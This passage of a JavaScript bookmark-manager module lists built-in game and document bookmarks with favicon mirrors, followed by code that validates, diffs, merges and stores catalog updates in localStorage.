          "id": "sub_arctic_4",
          "title": "Icon Horse Mirror",
          "url": "https://icon.horse/icon/xn--kwhenihadalife-utl6u222y.neocities.org",
          "icon": "https://www.google.com/s2/favicons?domain=icon.horse&sz=64"
        },
        {
          "id": "sub_arctic_5",
          "title": "FaviconAPI Mirror",
          "url": "https://faviconapi.com/vemetric/128/png/xn--kwhenihadalife-utl6u222y.neocities.org",
          "icon": "https://www.google.com/s2/favicons?domain=faviconapi.com&sz=64"
        },
        {
          "id": "sub_arctic_6",
          "title": "GetFavicon Mirror",
          "url": "https://getfavicon.dev/xn--kwhenihadalife-utl6u222y.neocities.org",
          "icon": "https://www.google.com/s2/favicons?domain=getfavicon.dev&sz=64"
        },
        {
          "id": "sub_arctic_7",
          "title": "Favicon IM Mirror",
          "url": "https://a.favicon.im/xn--kwhenihadalife-utl6u222y.neocities.org?larger=true",
          "icon": "https://www.google.com/s2/favicons?domain=a.favicon.im&sz=64"
        },
        {
          "id": "sub_arctic_8",
          "title": "Favicon SO Mirror",
          "url": "https://favicon.so/xn--kwhenihadalife-utl6u222y.neocities.org",
          "icon": "https://www.google.com/s2/favicons?domain=favicon.so&sz=64"
        },
        {
          "id": "sub_arctic_9",
          "title": "KeeWeb Favicon Mirror",
          "url": "https://services.keeweb.info/favicon/xn--kwhenihadalife-utl6u222y.neocities.org",
          "icon": "https://www.google.com/s2/favicons?domain=services.keeweb.info&sz=64"
        },
        {
          "id": "sub_arctic_10",
          "title": "Vemetric Favicon Mirror",
          "url": "https://favicon.vemetric.com/xn--kwhenihadalife-utl6u222y.neocities.org",
          "icon": "https://www.google.com/s2/favicons?domain=favicon.vemetric.com&sz=64"
        },
        {
          "id": "sub_arctic_11",
          "title": "Imgsrc Pub Mirror",
          "url": "https://imgsrc.pub/favicon?url=https://xn--kwhenihadalife-utl6u222y.neocities.org",
          "icon": "https://www.google.com/s2/favicons?domain=imgsrc.pub&sz=64"
        }
      ]
    },
    {
      "id": "bm_pgis2",
      "categoryId": "cat_op_websites",
      "subSectionId": "browser_games",
      "title": "PGIS 2",
      "url": "https://pgis.x10.mx/index.html",
      "type": "bookmark",
      "icon": "https://www.google.com/s2/favicons?domain=pgis.x10.mx&sz=64",
      "builtIn": true,
      "hidden": false,
      "order": 7,
      "subBookmarks": []
    },
    {
      "id": "bm_ubgdir",
      "categoryId": "cat_op_websites",
      "subSectionId": "docs_games",
      "title": "UBGDir",
      "url": "https://0800webdev.github.io/UBGdir/",
      "type": "bookmark",
      "icon": "/proxy/https://0800webdev.github.io/UBGdir/favicon.png",
      "builtIn": true,
      "hidden": false,
      "order": 0,
      "subBookmarks": []
    },
    {
      "id": "bm_the_wagon",
      "categoryId": "cat_op_websites",
      "subSectionId": "docs_games",
      "title": "The Wagon",
      "url": "https://the-wagonization.github.io/The-Wagon-Site/Pages/Home.html",
      "type": "folder_bookmark",
      "icon": "https://ssl.gstatic.com/docs/documents/images/kix-favicon7.ico",
      "builtIn": true,
      "hidden": false,
      "order": 1,
      "subBookmarks": []
    },
    {
      "id": "bm_ultimate_doc_of_docs",
      "categoryId": "cat_op_websites",
      "subSectionId": "docs_games",
      "title": "Ultimate Doc Of Docs",
      "url": "https://0800webdev.github.io/The-Ultimate-Doc-Of-Docs/",
      "type": "folder_bookmark",
      "icon": "/assets/icons/doc-of-docs-icon.png",
      "builtIn": true,
      "hidden": false,
      "order": 2,
      "subBookmarks": [
        {
          "id": "sub_udod_google_doc",
          "title": "Google Doc Mirror",
          "url": "https://docs.google.com/document/d/1foYnf3pqg00PbEMGnOKmdC0fJsUE_w_lmUZjGTHJtRo/",
          "icon": "https://www.google.com/s2/favicons?domain=docs.google.com&sz=64"
        }
      ]
    },
    {
      "id": "bm_project_19",
      "categoryId": "cat_op_websites",
      "subSectionId": "docs_games",
      "title": "Project 19",
      "url": "https://docs.google.com/document/d/1rlluLiVQc4DGr-kgcoLoF0qb4q1ooTRLj6RPiUxAZCo/",
      "type": "folder_bookmark",
      "icon": "https://ssl.gstatic.com/docs/documents/images/kix-favicon7.ico",
      "builtIn": true,
      "hidden": false,
      "disableQuickSaveWidget": true,
      "order": 3,
      "subBookmarks": []
    },
    {
      "id": "bm_project_idk",
      "categoryId": "cat_op_websites",
      "subSectionId": "docs_games",
      "title": "Project IDK",
      "url": "https://docs.google.com/document/d/1BDRltDqQLuyITBddWOGREhmGnNK8zR-kZ2-mHkkQ9rw/edit?tab=t.0",
      "type": "folder_bookmark",
      "icon": "https://ssl.gstatic.com/docs/documents/images/kix-favicon7.ico",
      "builtIn": true,
      "hidden": false,
      "disableQuickSaveWidget": true,
      "order": 4,
      "subBookmarks": []
    }
  ]
};

  // Resolve historical omitted placement once in the canonical source.
  defaults.bookmarks.forEach(function(item){if(!item.subSectionId)item.subSectionId=item.builtIn?'builtin':'user';});

  // Versions describe catalog content only. Diffing stable records verifies each release.
  var release = { version: '2026.10.23.1', date: '2026-10-23', summary: 'The current Heavenly bookmark collection.', data: defaults };
  var key = 'heavenly_bookmarks';
  var fields = ['title', 'url', 'icon', 'type', 'categoryId', 'subSectionId', 'side', 'defaultCollapsed', 'disableQuickSaveWidget', 'mirrorEligible'];
  var personal = ['categoryId', 'subSectionId', 'side', 'disableQuickSaveWidget'];
  function clone(value) { return JSON.parse(JSON.stringify(value)); }
  function equal(a, b) { return JSON.stringify(a) === JSON.stringify(b); }
  function validate(data, allowLegacy) {
    if (!data || !Array.isArray(data.categories) || !Array.isArray(data.bookmarks)) throw new Error('The saved bookmark collection is invalid. Export a backup before repairing it.');
    var ids = Object.create(null);
    function id(value, prefix) {
      if (!value || typeof value.id !== 'string' || !value.id || ids[prefix + value.id]) throw new Error('The bookmark collection contains missing or duplicate identities.');
      ids[prefix + value.id] = true;
    }
    data.categories.forEach(function (cat) {
      id(cat, 'category:');
      if (cat.subSections !== undefined && !Array.isArray(cat.subSections)) throw new Error('Invalid bookmark sections.');
      (cat.subSections || []).forEach(function (section) { id(section, 'section:' + cat.id + ':'); });
    });
    function entries(items, nested) { items.forEach(function (item) { if (!(allowLegacy && nested && item && !item.id && typeof item.url === 'string' && item.url)) id(item, 'bookmark:'); if (item.subBookmarks !== undefined && !Array.isArray(item.subBookmarks)) throw new Error('Invalid nested bookmarks.'); entries(item.subBookmarks || [], true); }); }
    entries(data.bookmarks, false);
    return data;
  }
  function records(data) {
    var result = Object.create(null);
    function record(kind, item, parent) {
      var value = clone(item); delete value.subBookmarks; delete value.subSections;
      var identity = kind === 'section' ? kind + ':' + parent + ':' + item.id : kind + ':' + item.id;
      result[identity] = { key: identity, kind: kind, parent: parent || null, value: value };
    }
    data.categories.forEach(function (cat) { record('category', cat); (cat.subSections || []).forEach(function (s) { record('section', s, cat.id); }); });
    function walk(items, parent) { items.forEach(function (item) { record('bookmark', item, parent); walk(item.subBookmarks || [], item.id); }); }
    walk(data.bookmarks, null);
    return result;
  }
  function signature(record) {
    if (!record || !record.value) return null;
    var value = { parent: record.parent };
    fields.forEach(function (field) { if (record.value[field] !== undefined) value[field] = record.value[field]; });
    return value;
  }
  function stamp(value) {
    var str = JSON.stringify(value), hash = 2166136261;
    for (var i = 0; i < str.length; i++) { hash ^= str.charCodeAt(i); hash = Math.imul(hash, 16777619); }
    return (hash >>> 0).toString(16);
  }
  function metadata(data, bundled) {
    function object(value) { return value && typeof value === 'object' && !Array.isArray(value); }
    function snapshot(value) {
      return object(value) && Object.keys(value).every(function(identity){
        var record=value[identity];
        if(!object(record)||!object(record.value)||typeof record.value.id!=='string')return false;
        var expected=record.kind==='section'?'section:'+record.parent+':'+record.value.id:record.kind+':'+record.value.id;
        return ['category','section','bookmark'].indexOf(record.kind)!==-1 && record.key===identity && expected===identity;
      });
    }
    var saved=data._catalog;
    if (saved && saved.schema===1 && snapshot(saved.base) && snapshot(saved.accepted) && Array.isArray(saved.installed) && saved.installed.every(function(id){return typeof id==='string';}) && object(saved.decisions) && object(saved.tombstones)) return saved;
    // Legacy adoption records only identities already present. Missing defaults are
    // reviewable catch-up additions, never automatically imported on an old device.
    var existing = records(data), official = records(bundled.data), base = {}, accepted = {};
    Object.keys(official).forEach(function (identity) { if (existing[identity]) { base[identity] = clone(official[identity]); accepted[identity] = clone(official[identity]); } });
    data._catalog = { schema: 1, version: null, base: base, accepted: accepted, installed: Object.keys(base), tombstones: {}, decisions: {}, conflicts: [] };
    return data._catalog;
  }
  function migrateLegacyIds(data, bundled) {
    var used=Object.create(null), official=records(bundled.data);
    function collect(items){items.forEach(function(item){if(item.id)used[item.id]=true;collect(item.subBookmarks||[]);});}
    collect(data.bookmarks);
    function children(parent){
      var aliases=Object.create(null);
      (parent.subBookmarks||[]).forEach(function(child){
        if(!child.id){
          var url=navigation.bookmarkKey(child.url), match=Object.keys(official).map(function(key){return official[key];}).find(function(record){return record.kind==='bookmark'&&record.parent===parent.id&&!child.isUser&&navigation.bookmarkKey(record.value.url)===url&&!used[record.value.id];});
          var identity=match?match.value.id:'legacy_'+stamp([parent.id,url]), suffix=0, initial=identity;
          while(used[identity])identity=initial+'_'+(++suffix);
          child.id=identity;used[identity]=true;
          if(!aliases['url:'+url])aliases['url:'+url]='id:'+identity;
        }
        children(child);
      });
      var preferences=parent.mirrorPreferences;
      if(preferences&&typeof preferences==='object'){
        ['active','preferred'].forEach(function(field){if(aliases[preferences[field]])preferences[field]=aliases[preferences[field]];});
        if(Array.isArray(preferences.order))preferences.order=preferences.order.map(function(identity){return aliases[identity]||identity;});
      }
    }
    data.bookmarks.forEach(children);
  }
  function compatible(data, bundled) {
    // Structural compatibility is independent of optional content decisions.
    var canonical = records(bundled.data);
    data.categories.forEach(function (cat) { if (!cat.subSections) cat.subSections = [{ id:'builtin', title:'Built-In', builtIn:true }, { id:'user', title:'Your Bookmarks', builtIn:true }]; });
    data.bookmarks.forEach(function (item) {
      if (!item.subSectionId) { var def = canonical['bookmark:' + item.id]; var cat = data.categories.find(function (c) { return c.id === item.categoryId; }); item.subSectionId = def && def.value.categoryId === item.categoryId ? (def.value.subSectionId || (def.value.builtIn ? 'builtin' : 'user')) : (item.builtIn ? 'builtin' : 'user'); if (cat && !cat.subSections.some(function (s) { return s.id === item.subSectionId; })) { if(!cat.subSections.length)cat.subSections.push({id:'user',title:'Your Bookmarks',builtIn:false}); item.subSectionId = cat.subSections.some(function(s){return s.id==='user';}) ? 'user' : cat.subSections[0].id; } }
    });
    navigation.migrateBookmarkIcons(data);
    return data;
  }
  function prepare(data, bundled) {
    bundled = bundled || release; validate(bundled.data); validate(data, true);
    migrateLegacyIds(data, bundled); validate(data);
    compatible(data, bundled);
    var meta = metadata(data, bundled), present = records(data);
    meta.installed.forEach(function (identity) { if (!present[identity]) meta.tombstones[identity] = true; });
    return data;
  }
  function fresh(bundled) {
    bundled = bundled || release;
    var data = clone(bundled.data), official = records(data);
    data._catalog = { schema:1, version:bundled.version, base:clone(official), accepted:clone(official), installed:Object.keys(official), tombstones:{}, decisions:{}, conflicts:[] };
    return validate(data);
  }
  function pending(data, bundled) {
    bundled = bundled || release;
    data = prepare(clone(data), bundled);
    var meta = data._catalog, next = records(bundled.data), changes = [];
    Object.keys(next).concat(Object.keys(meta.base).filter(function (id) { return !next[id]; })).forEach(function (identity) {
      var before = meta.base[identity], after = next[identity];
      if (equal(signature(before), signature(after))) return;
      var change = { key:identity, kind:after ? before ? 'updated' : 'added' : 'removed', before:before || null, after:after || null };
      change.id = identity + ':' + stamp([signature(before), signature(after)]);
      if (meta.tombstones[identity]) return;
      changes.push(change);
    });
    // A new child in a previously skipped container must disclose the minimal
    // parent dependency too. Other skipped siblings stay skipped.
    var existing = records(data), included = {};
    changes.forEach(function(c){included[c.key]=true;});
    function dependency(identity) {
      if (!identity || existing[identity] || included[identity] || meta.tombstones[identity] || !next[identity]) return;
      var record=next[identity];
      dependency(record.kind==='section'?'category:'+record.parent:record.parent?'bookmark:'+record.parent:record.kind==='bookmark'?'section:'+record.value.categoryId+':'+record.value.subSectionId:null);
      var c={key:identity,kind:'added',before:meta.base[identity]||null,after:record,dependency:true};c.id=identity+':'+stamp([signature(c.before),signature(record),'dependency']);included[identity]=true;changes.unshift(c);
    }
    changes.slice().forEach(function(c){if(!c.after)return;var r=c.after;dependency(r.kind==='section'?'category:'+r.parent:r.parent?'bookmark:'+r.parent:r.kind==='bookmark'?'section:'+r.value.categoryId+':'+r.value.subSectionId:null);});
    // Canonical traversal is parents before children, including dependencies.
    var order=Object.keys(next);changes.sort(function(a,b){return order.indexOf(a.key)-order.indexOf(b.key);});
    return { version:bundled.version, date:bundled.date, summary:bundled.summary, changes:changes, fingerprint:stamp(changes.map(function (c) { return c.id; })) };
  }
  function appendOrder(items, match) { return items.reduce(function (max, item) { return match(item) ? Math.max(max, Number(item.order) || 0) : max; }, -1) + 1; }
  function findItem(data, identity) {
    var rec = records(data)[identity];
    if (!rec) return null;
    if (rec.kind === 'category') return data.categories.find(function (c) { return c.id === rec.value.id; });
    if (rec.kind === 'section') return data.categories.find(function (c) { return c.id === rec.parent; }).subSections.find(function (s) { return s.id === rec.value.id; });
    function find(items) { for (var i=0;i<items.length;i++) { if (items[i].id === rec.value.id) return items[i]; var child=find(items[i].subBookmarks || []); if(child)return child; } return null; }
    return find(data.bookmarks);
  }
  function merge(data, bundled, decision) {
    bundled = bundled || release; data = prepare(clone(data), bundled);
    var review = pending(data, bundled), meta = data._catalog, next = records(bundled.data);
    if (!review.changes.length) return data;
    meta.conflicts = [];
    review.changes.forEach(function (change) {
      var record = change.after || change.before, item = findItem(data, change.key);
      meta.decisions[change.id] = decision;
      if (decision !== 'applied') return;
      if (!change.after) { if (item) item.catalogRetired = true; delete meta.accepted[change.key]; return; }
      if (!item) {
        item = clone(record.value);
        if (record.kind === 'category') { item.subSections = []; item.order = appendOrder(data.categories, function (c) { return c.side === item.side; }); data.categories.push(item); }
        else if (record.kind === 'section') {
          var category = data.categories.find(function (c) { return c.id === record.parent; });
          if (!category) { meta.conflicts.push({key:change.key, title:item.title, message:'Its original category was removed; restore that category to install this section.'}); return; }
          category.subSections.push(item);
        } else if (record.parent) {
          var parent = findItem(data, 'bookmark:' + record.parent);
          if (!parent) { meta.conflicts.push({key:change.key, title:item.title, message:'Its original folder was removed; this link was left uninstalled.'}); return; }
          if (!parent.subBookmarks) parent.subBookmarks = [];
          item.order = appendOrder(parent.subBookmarks, function () { return true; }); parent.subBookmarks.push(item);
        } else {
          var cat = data.categories.find(function (c) { return c.id === item.categoryId; });
          if (!cat) { meta.conflicts.push({key:change.key, title:item.title, message:'Its original category was removed; this bookmark was left uninstalled.'}); return; }
          if (!cat.subSections.some(function (s) { return s.id === item.subSectionId; })) item.subSectionId = cat.subSections.some(function (s) { return s.id === 'user'; }) ? 'user' : cat.subSections[0] && cat.subSections[0].id;
          // Preserve Coolmath's historical URL deduplication; all normal identity
          // matching uses stable IDs, never mutable titles or URLs.
          if (item.id === 'bm_coolmath' && navigation.findBookmarkByUrl(data, item.url)) return;
          var section = item.subSectionId;
          item = navigation.prepareMissingBookmark(data, item); item.subSectionId = section;
          if (item.id !== 'bm_coolmath') item.order = appendOrder(data.bookmarks, function (b) { return b.categoryId === item.categoryId && b.subSectionId === item.subSectionId; });
          data.bookmarks.push(item);
        }
      } else {
        var previous = meta.accepted[change.key] || change.before;
        fields.forEach(function (field) {
          if (personal.indexOf(field) !== -1 || equal(previous && previous.value[field], record.value[field])) return;
          if (item[field] === undefined || equal(item[field], previous && previous.value[field])) {
            if (field === 'url' && item.url && item.url !== record.value.url) item.catalogPreviousUrls = (item.catalogPreviousUrls || []).concat([item.url]).filter(function(url,index,all){return all.indexOf(url)===index;});
            if (record.value[field] === undefined) delete item[field]; else item[field] = clone(record.value[field]);
          } else meta.conflicts.push({key:change.key, title:item.title, field:field, message:'Kept your customized ' + field + '.'});
        });
        delete item.catalogRetired;
      }
      meta.accepted[change.key] = clone(record);
    });
    meta.base = clone(next); meta.version = bundled.version; meta.lastDecision = decision;
    meta.installed = meta.installed.concat(Object.keys(next).filter(function (identity) { return !!findItem(data, identity); })).filter(function(identity,index,all){return all.indexOf(identity)===index;});
    validate(data);
    return data;
  }
  function load(storage, bundled) {
    bundled = bundled || release;
    var raw = storage.getItem(key), data = raw === null ? fresh(bundled) : prepare(JSON.parse(raw), bundled);
    var serialized = JSON.stringify(data);
    if (raw !== serialized) storage.setItem(key, serialized);
    return data;
  }
  function commit(storage, decision, expected, bundled) {
    bundled = bundled || release;
    if (decision !== 'applied' && decision !== 'skipped') throw new Error('Unknown catalog decision.');
    var raw = storage.getItem(key);
    if (raw === null) throw new Error('The collection changed. Reopen Bookmark Updates.');
    var data = prepare(JSON.parse(raw), bundled), review = pending(data, bundled);
    if (expected && expected !== review.fingerprint) throw new Error('The available updates changed. Reopen Bookmark Updates to review them.');
    var result = merge(data, bundled, decision);
    // One localStorage write commits the collection and review decision together.
    // A quota/access failure leaves the original value intact.
    storage.setItem(key, JSON.stringify(result));
    return result;
  }
  function imported(data, source, complete, bundled) {
    bundled = bundled || release; data = clone(data);
    if (complete) {
      delete data._catalog;
      if (source && source._catalog && source._catalog.schema === 1) data._catalog = clone(source._catalog);
    }
    data = prepare(data, bundled);
    if (!complete && source && source._catalog && source._catalog.schema === 1) {
      var incoming = source._catalog;
      // A selective merge only honors a decision that matches the exact local
      // pending change and its bundled destination. Version labels grant nothing.
      pending(data, bundled).changes.forEach(function (change) {
        var decision=incoming.decisions && incoming.decisions[change.id];
        if (decision !== 'skipped' || !equal(signature(incoming.base && incoming.base[change.key]), signature(change.after))) return;
        if (change.after) data._catalog.base[change.key]=clone(change.after); else delete data._catalog.base[change.key];
        data._catalog.decisions[change.id]='skipped';
      });
    }
    return data;
  }

  return { defaults:defaults, release:release, fresh:fresh, load:load, prepare:prepare, pending:pending, merge:merge, commit:commit, validate:validate, imported:imported, records:records };
}));
